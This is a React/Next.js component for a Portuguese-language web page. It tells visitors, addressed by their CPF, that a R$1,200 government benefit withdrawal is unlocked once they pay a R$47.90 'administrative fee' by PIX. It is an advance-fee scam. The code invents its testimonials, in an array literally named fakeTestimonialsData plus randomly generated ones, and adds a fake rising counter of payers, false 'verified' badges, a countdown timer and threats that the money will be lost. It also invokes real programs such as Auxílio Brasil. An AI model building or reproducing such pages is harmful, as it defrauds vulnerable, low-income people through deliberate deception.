
"use client";

import type React from 'react';
import { useState, useEffect } from 'react';
import Image from 'next/image';
import OfferTimer from '@/components/features/OfferTimer';
import { Button } from '@/components/ui/button';
import { CheckCircle, TrendingUp, ShieldCheck, Star, BadgePercent, Users, AlertTriangle, Clock, ShoppingCart, Gift, Award } from 'lucide-react';

interface OfferStepProps {
  cpf: string | null;
}

interface Testimonial {
  name: string;
  location: string;
  text: string;
  photoUrl?: string;
  dataAiHint?: string;
}

const fakeTestimonialsData: Testimonial[] = [
   {
    name: "MARIA S.",
    location: "Fortaleza/CE",
    text: "Paguei a taxa de R$47,90 com o <strong>CU NA MÃO</strong>, mas para minha surpresa... <strong>CAIU NA HORA!</strong> R$1.200,00 limpos na conta! Essa grana <strong>SALVOU MEU MÊS E MINHA VIDA!</strong> Simplesmente <strong>FODAA!</strong>",
    photoUrl: "https://placehold.co/56x56.png",
    dataAiHint: "person avatar"
  },
  {
    name: "J. COSTA",
    location: "Interior de MG",
    text: "No começo, achei que era <strong>ENGANAÇÃO TOTAL</strong>, mas arrisquei os R$47,90. Qual não foi minha surpresa quando vi o PIX de <strong>R$1.200,00 CAIR NA CONTA em MINUTOS!</strong> Dinheiro extra que <strong>ME TIROU DO SUFOCO!</strong> Recomendo DEMAIS!",
    photoUrl: "https://placehold.co/56x56.png",
    dataAiHint: "person avatar"
  },
  {
    name: "ANA P.",
    location: "Salvador/BA",
    text: "Confesso que tremi na base pra pagar a taxa, achei que ia <strong>PERDER MEU DINHEIRINHO SUADO</strong>. Mas a necessidade falou mais alto. E não é que o negócio <strong>FUNCIONA MESMO?!</strong> R$1.200,00 liberados rapidinho! <strong>MELHOR INVESTIMENTO</strong> que fiz esse ano!",
    photoUrl: "https://placehold.co/56x56.png",
    dataAiHint: "person avatar"
  },
];


const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
  const [peopleServed, setPeopleServed] = useState(2402);
  const [testimonials, setTestimonials] = useState<Testimonial[]>(fakeTestimonialsData);

  useEffect(() => {
    const interval = setInterval(() => {
      setPeopleServed(prev => prev + Math.floor(Math.random() * 5) + 1);
    }, 1500);

    const testimonialInterval = setInterval(() => {
      const names = ["CARLOS R.", "SOFIA L.", "PAULO G.", "LUCIA F."];
      const locations = ["Curitiba/PR", "Manaus/AM", "Brasília/DF", "Porto Alegre/RS"];
      const newTestimonial: Testimonial = {
        name: names[Math.floor(Math.random() * names.length)],
        location: locations[Math.floor(Math.random() * locations.length)],
        text: "Paguei a taxa com <strong>medo</strong>, mas valeu! R$1.200 na conta <strong>rapidinho</strong>. Funciona DE VERDADE!",
        photoUrl: "https://placehold.co/56x56.png",
        dataAiHint: "person avatar"
      };
      setTestimonials(prev => [newTestimonial, ...prev.slice(0, prev.length-1)].sort(() => 0.5 - Math.random()));
    }, 8000);

    return () => {
      clearInterval(interval);
      clearInterval(testimonialInterval);
    };
  }, []);

  const handleLiberarAcessoClick = () => {
    console.log("LIBERAR ACESSO IMEDIATO AGORA clicado! CPF:", cpf, "Redirect to R$47,90 checkout.");
    // Replace with actual redirect to AppMax checkout URL
    window.location.href = "https://appmax.com.br/checkout-url-example"; 
    alert("🚨 ATENÇÃO: Você será redirecionado para o pagamento SEGURO da taxa administrativa de R$47,90. Liberação dos R$1.200,00 IMEDIATA após confirmação do PIX!");
  };

  const formattedCpf = cpf || '***.***.***-**';

  return (
    <div className="w-full max-w-4xl mx-auto p-4 md:p-6 space-y-8 bg-background text-foreground">
        
        {/* Título Principal */}
        <div className="text-center">
           <h2 className="font-headline text-xl md:text-2xl font-bold mb-2 uppercase text-foreground">
            <span className="text-foreground">🔥 ALERTA MÁXIMO, CPF {formattedCpf}!</span><br/>
            SEU SAQUE DE <strong className="text-3xl md:text-4xl font-bold text-foreground">R$1.200,00</strong> FOI LIBERADO AGORA!
          </h2>
        </div>

        {/* Benefícios disponíveis em destaque */}
        <div className="bg-card rounded-xl shadow-xl p-6 md:p-8 border-l-8 border-accent animate-scale-in">
            <h2 className="text-2xl md:text-3xl font-black text-card-foreground mb-6 text-center">Acesso LIBERADO para você:</h2>

            <div className="grid md:grid-cols-3 gap-6 mb-8">
                {[
                    {
                        nome: "Programa Auxílio Brasil",
                        valor: "R$ 1200/mês",
                        icon: "💰",
                        descricao: "Benefício mensal direto na sua conta!",
                    },
                    {
                        nome: "Tarifa Social de Energia",
                        valor: "Até 65% de desconto",
                        icon: "⚡",
                        descricao: "Redução significativa na sua conta de luz!",
                    },
                    {
                        nome: "Vale-Gás Federal",
                        valor: "R$ 120 mensal",
                        icon: "🔥",
                        descricao: "Auxílio para comprar seu gás sem aperto!",
                    },
                    {
                        nome: "Dinheiro Perdido",
                        valor: "R$5000 por CPF",
                        icon: "💸",
                        descricao: "Valores esquecidos em contas e bancos!",
                    },
                ].map((beneficio, index) => (
                    <div key={index} className="bg-accent/10 p-6 rounded-lg border border-accent/30 shadow-md transform hover:scale-105 transition-all duration-200">
                        <div className="text-center">
                            <div className="text-4xl mb-3 animate-pulse-slow">{beneficio.icon}</div>
                            <h3 className="font-bold text-card-foreground mb-2 text-lg">{beneficio.nome}</h3>
                            <p className="text-accent font-black text-2xl mb-2">{beneficio.valor}</p>
                            <p className="text-sm text-muted-foreground">{beneficio.descricao}</p>
                            <CheckCircle className="text-accent mx-auto mt-3 animate-fade-in" size={24} />
                        </div>
                    </div>
                ))}
            </div>
        </div>
          
        {/* Lista de Benefícios */}
        <ul className="space-y-2 text-left text-sm md:text-base max-w-md mx-auto bg-secondary/20 p-4 rounded-lg border border-primary/30 shadow">
          {[
            { icon: <ShoppingCart className="h-6 w-6 text-green-500 mr-2 mt-0.5 shrink-0" />, text: "<strong class='text-primary'>SAQUE IMEDIATO EM 5 MINUTOS:</strong> <span class='text-accent font-bold text-lg'>R$1.200,00</span> direto na sua conta Chave PIX <strong class='underline text-accent'>AGORA MESMO!</strong>" },
            { icon: <Gift className="h-6 w-6 text-blue-500 mr-2 mt-0.5 shrink-0" />, text: "<strong class='text-primary'>ACESSO VIP GOV+ EXCLUSIVO:</strong> Plataforma Secreta de Benefícios (Valor R$297,00 - <span class='text-accent font-bold'>HOJE GRÁTIS</span>)" },
            { icon: <Users className="h-6 w-6 text-purple-500 mr-2 mt-0.5 shrink-0" />, text: "<strong class='text-primary'>SUPORTE PREMIUM RELÂMPAGO 24/7:</strong> Atendimento VIP WhatsApp <span class='italic text-primary'>Ultra Rápido</span> e Prioritário para VOCÊ!" },
            { icon: <Award className="h-6 w-6 text-yellow-500 mr-2 mt-0.5 shrink-0" />, text: "<strong class='text-primary'>BÔNUS SECRETO HOJE:</strong> Guia Exclusivo 'Nome Limpo em 7 Dias' (SPC/Serasa Destravado)!" },
          ].map((benefit, index) => (
            <li key={index} className="flex items-start">
              {benefit.icon}
              <span className="font-medium text-foreground" dangerouslySetInnerHTML={{ __html: benefit.text }} />
            </li>
          ))}
        </ul>
        

        {/* Área de Urgência */}
        <div className="bg-destructive/10 p-3 sm:p-4 rounded-lg border-2 border-destructive text-center shadow-xl text-destructive space-y-2">
          <div className="flex flex-wrap items-center justify-center text-center font-bold text-md sm:text-lg md:text-xl mb-2">
            <Clock className="h-8 w-8 mr-2" /> 
            <span className="uppercase">CORRE! SEU TEMPO TÁ ACABANDO!</span>
          </div>
          <div className="text-center my-2">
             <OfferTimer initialMinutes={4} initialSeconds={31} />
          </div>
          <p className="text-sm sm:text-md md:text-lg font-bold uppercase leading-tight">
            <AlertTriangle className="inline-block h-6 w-6 mr-1" /> Atenção: <span className="text-2xl md:text-3xl underline">NÃO SEJA BURRO!</span><br/> Se você não sacar <strong >AGORA</strong>, seus <strong >R$1.200,00</strong> serão <strong >CANCELADOS</strong> e <strong >PERDIDOS PARA SEMPRE</strong> às 23:59 de <strong >HOJE!</strong><br/> Não tem choro nem vela, <strong className="text-xl">É AGORA OU NUNCA!</strong>
          </p>
        </div>

        {/* Seção de Preço */}
        <div className="text-center p-4 md:p-6 bg-primary/10 rounded-xl shadow-lg border-2 border-accent ring-2 ring-accent/50 space-y-2">
          <h3 className="font-headline text-xl md:text-2xl font-bold text-primary mb-1 uppercase">
             <BadgePercent className="inline-block h-7 w-7 mr-1 text-accent" /> ÚNICA TAXA DE ACESSO!
          </h3>
          <p className="text-muted-foreground line-through text-2xl md:text-3xl mb-0">DE R$297,00</p>
          <p className="text-7xl md:text-8xl font-extrabold text-accent mb-1">
            R$47<span className="text-5xl md:text-6xl align-top">,90</span>
          </p>
          <p className="text-lg md:text-xl font-bold text-primary mb-2 uppercase">(VOCÊ ACABA DE ECONOMIZAR R$249,10 HOJE!)</p>
          <p className="text-sm md:text-md text-foreground/90 max-w-lg mx-auto">
            <strong>IMPORTANTE:</strong> Pague <strong>SOMENTE AGORA</strong> esta taxa para cobrir os custos de <strong>processamento SEGURO</strong> e <strong>liberação automática</strong> dos seus R$1.200,00 via PIX! <strong className="text-accent underline">SAQUE GARANTIDO IMEDIATAMENTE APÓS O PIX!</strong>
          </p>
        </div>

        <Button
          className="w-full h-16 md:h-20 text-lg md:text-xl font-bold bg-accent text-accent-foreground hover:bg-accent/90 shadow-xl transform hover:scale-105 transition-transform duration-150 ease-out ring-4 ring-green-300 hover:ring-green-400 whitespace-normal text-center"
          onClick={handleLiberarAcessoClick}
        >
          Quero Receber o dinheiro!
        </Button>
        <div className="text-center text-xs text-muted-foreground flex items-center justify-center">
          <ShieldCheck className="h-4 w-4 mr-1 text-green-600" /> Pagamento 100% SEGURO e Criptografado! Processado por AppMax.
        </div>
        
        {/* SEÇÃO DE PROVA SOCIAL */}
        <div>
          <h3 className="font-headline text-lg md:text-xl font-bold text-foreground text-center mb-5 uppercase flex items-center justify-center">
            <Users className="mr-2 h-7 w-7" /> 
            PESSOAS QUE SACARAM HOJE!
          </h3>
          <div className="space-y-4">
            {testimonials.map((testimonial, index) => (
              <div key={index} className="p-4 md:p-5">
                  <div className="flex items-start">
                      {testimonial.photoUrl && (
                          <Image
                          src={testimonial.photoUrl}
                          alt={`Foto de ${testimonial.name}`}
                          width={56} 
                          height={56}
                          data-ai-hint={testimonial.dataAiHint || "person avatar"}
                          className="rounded-full mr-4 border-2 border-accent shadow-md"
                          />
                      )}
                      <div className="flex-1">
                          <p className="font-headline text-lg font-semibold text-primary mb-1">🔥 SAQUE CONFIRMADO!</p>
                          <p className="text-sm md:text-base text-foreground italic leading-tight" dangerouslySetInnerHTML={{ __html: testimonial.text }} />
                          <p className="text-sm text-muted-foreground mt-2 font-bold">- {testimonial.name}, {testimonial.location}</p>
                          <p className="text-xs text-green-600 font-semibold mt-1">(VERIFICADO AGORA ✅)</p>
                      </div>
                  </div>
              </div>
            ))}
          </div>
          <div className="mt-10 text-center p-5 bg-primary text-primary-foreground rounded-lg shadow-xl border-2 border-yellow-300">
            <TrendingUp className="h-10 md:h-12 w-10 md:h-12 mx-auto mb-2 text-yellow-300 animate-pulse" />
            <p className="text-5xl md:text-6xl font-bold text-yellow-300">{peopleServed.toLocaleString('pt-BR')}</p>
            <p className="text-md md:text-lg font-semibold uppercase">📈 BRASILEIROS JÁ SACARAM SÓ HOJE! <span className="text-yellow-300">NÃO FIQUE PRA TRÁS!</span></p>
          </div>
        </div>
    </div>
  );
};

export default OfferStep;

    